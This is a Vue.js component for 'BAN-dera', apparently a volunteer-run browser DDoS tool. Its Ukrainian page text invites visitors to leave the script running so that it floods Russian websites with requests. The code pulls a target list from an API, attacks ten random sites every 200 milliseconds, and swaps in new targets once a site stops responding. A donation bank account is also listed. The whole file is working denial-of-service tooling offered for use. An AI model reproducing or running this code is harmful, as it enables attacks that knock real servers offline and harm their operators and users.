<template>
    <div class="container">
        <div class="row text-center mt-3">
            <h1>BAN-dera</h1>
            <p>Кількість сайтів в базі: {{ targets.length }} (<a target="_blank" href="https://t.me/nestoruk">Додати сайт / перевірити в списку</a>)</p>
        </div>
        <div class="row mt-3">
            <div class="col-6">
                <p>DoS-атака (Denial-of-service) - одним із найпоширеніших методів нападу, насичення атакованого сервера великою кількістю зовнішніх запитів.</p>
                <p>З Вашого комп'ютера буде надсилатись нескінченна кількість запитів на російські сайти, що може відправити їх в слід за рускім воєнним кораблем. Тобто, НАХУЙ. Просто залишіть скрипт працюючим. Якщо якийсь сайт буде визначено як "відвалений" - його буде замінено на інший, тобто Ваша атака буде постійною.</p>
                <p><strong>УВАГА!</strong> Так як цей скрипт ініціює велику кількість запитів за короткий проміжок часу, його запуск може сповільнити роботу Вашого комп'ютера та використати велику кількість трафіку. Не рекомендується використовувати його з мобільних мереж, де, зазвичай, трафік обмежений.</p>
                <p class="fst-italic">Це - сайт з відкритим кодом (<a href="https://github.com/vnestoruk/ban-dera">Переглянути на Github</a>). Долучайтесь до розробки, або просто <a target="_blank" href="https://t.me/nestoruk">напишіть мені</a> ідеї щодо покращення.</p>
            </div>
            <div class="col-6 text-center">
                <h3>Допоможи армії</h3>
                <p>Bank: National Bank of Ukraine</p>
                <p>MFO 300001</p>
                <p>Account No. UA843000010000000047330992708</p>
                <p>EDRPOU Code 00032106</p>
                <p>Payee: National Bank of Ukraine</p>
            </div>
        </div>
        <hr>
        <div class="row mt-3">
            <table>
                <thead>
                <tr>
                    <td>URL</td>
                    <td>Запитів</td>
                    <td>Успішних</td>
                    <td>Помилкових</td>
                    <td>Відношення</td>
                </tr>
                </thead>
                <tbody id="bandera">
                <tr v-for="(b, index) in queue">
                    <td>{{ b.target.url }}</td>
                    <td>{{ b.requests.total }}</td>
                    <td>{{ b.requests.success }}</td>
                    <td>{{ b.requests.failed }}</td>
                    <td>{{ b.getRate() | rate }}</td>
                </tr>
                </tbody>
            </table>
        </div>
    </div>
</template>

<script>
import Bandera from "../modules/bandera";
import request from "../modules/request";

export default {
    name: "Bandera",
    data() {
        return {
            targets: [],
            queue: []
        }
    },
    computed: {

    },
    mounted() {
        // Get all the targets
        request({
            method: 'GET',
            url: '/api/targets'
        }).then(
            (response) => {
                this.targets = response.data;
                this.init();
                this.start();
            }
        )
    },
    methods: {
        init() {
            this.getRandomTargets(10);
        },
        start() {
            if (this.queue.length === 0) return;
            setInterval(() => {
                this.queue.filter(i => {
                    if (i.requests.strike > 100) return this.replaceTarget(i);
                    i.run();
                });

            }, 200);
        },
        stop() {
            this.queue = [];
        },
        // recursively getting random targets
        getRandomTargets(count, targets = []) {
            console.log('recursive');
            if (count === 0) return targets.filter(target => {
                let i = new Bandera(target);
                this.queue.push(i);
            });

            let selectedTarget = this.targets.sort(() => 0.5 - Math.random()).slice(0, 1)[0];
            if (typeof targets.find(item => item.id === selectedTarget.id) === 'undefined') {
                targets.push(selectedTarget);
                this.getRandomTargets(--count, targets);
            } else {
                this.getRandomTargets(count, targets);
            }
        },
        async replaceTarget(obj) {
            this.queue.splice(this.queue.findIndex(item => item.target.id === obj.target.id), 1);
            this.getRandomTargets(1);
        }
    }
}
</script>

<style scoped>

</style>
